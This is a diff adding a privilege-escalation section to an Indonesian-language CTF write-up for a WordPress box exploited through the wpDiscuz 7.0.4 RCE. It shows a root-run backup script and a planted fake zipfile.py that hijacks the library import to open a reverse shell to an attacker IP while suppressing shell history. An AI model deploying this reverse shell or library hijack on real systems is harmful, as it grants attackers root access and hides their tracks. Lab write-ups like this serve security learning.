@@ -100,3 +100,104 @@ Melakukan scanning wordpress dengan metasploit untuk mencari beberapa plugin out
 Eksplotasi Plugin WpDiscuz-7.0.4-RCE menggunakan kode python dari [PoC](https://github.com/hev0x/CVE-2020-24186-wpDiscuz-7.0.4-RCE/blob/main/wpDiscuz_RemoteCodeExec.py)
 
 ![alt text](images/user-flag.png)
+
+
+
+# Privillage Escalation
+
+Dikarenakan shell yang kurang interaktif menggunakan shell dari code python sebelumnya saya beralih menggunakan metasploit untuk masuk ke dalam shell
+
+![alt text](images/metasploit-shell.png)
+
+
+
+Pada directory home/apollo/.local terdapat sebuah python code yang berjalan sebagai root dan yang mana bisa dilakukan library hijacking pada code tersebut.
+
+```
+-rwxr-xr-- 1 root     root     1.5K Dec 23 10:37 backup.py
+```
+
+
+
+**Backup.py**
+
+```py
+import shutil
+import zipfile
+import os
+
+def backup_folder():
+    source_folder = '/var/www/html/'  # Specify the source folder path here
+    backup_location = '/opt/backup'  # Change this to your desired backup location
+
+    # Ensure the source folder exists
+    if not os.path.exists(source_folder):
+        print(f"The source folder '{source_folder}' does not exist.")
+        return
+    
+    # Create backup directory if it doesn't exist
+    if not os.path.exists(backup_location):
+        os.makedirs(backup_location)
+    
+    # Generate the backup file name
+    source_folder_name = os.path.basename(os.path.normpath(source_folder))
+    zip_filename = f"{source_folder_name}_backup.zip"
+    backup_path = os.path.join(backup_location, zip_filename)
+
+    # Compress the source folder into a ZIP file
+    with zipfile.ZipFile(backup_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        for root, _, files in os.walk(source_folder):
+            for file in files:
+                file_path = os.path.join(root, file)
+                try:
+                    # Add files to the ZIP file if permission is granted
+                    zipf.write(file_path, os.path.relpath(file_path, source_folder))
+                except Exception as e:
+                    print(f"Skipping file '{file_path}' due to lack of permission: {e}")
+                    continue
+
+    print(f"Backup created successfully at: {backup_path}")
+
+def main():
+    backup_folder()
+
+if __name__ == "__main__":
+    main()
+
+```
+
+
+**zipfile.py**
+
+```py
+import os
+import pty
+import socket
+
+lhost = "10.18.200.73"
+lport = 4444
+
+ZIP_DEFLATED = 0
+
+class ZipFile:
+    def close(*args):
+        return
+
+    def write(*args):
+        return
+
+    def __init__(self, *args):
+        return
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((lhost, lport))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+os.putenv("HISTFILE",'/dev/null')
+pty.spawn("/bin/bash")
+s.close()
+```
+
+
+![alt text](images/root-flag.png)
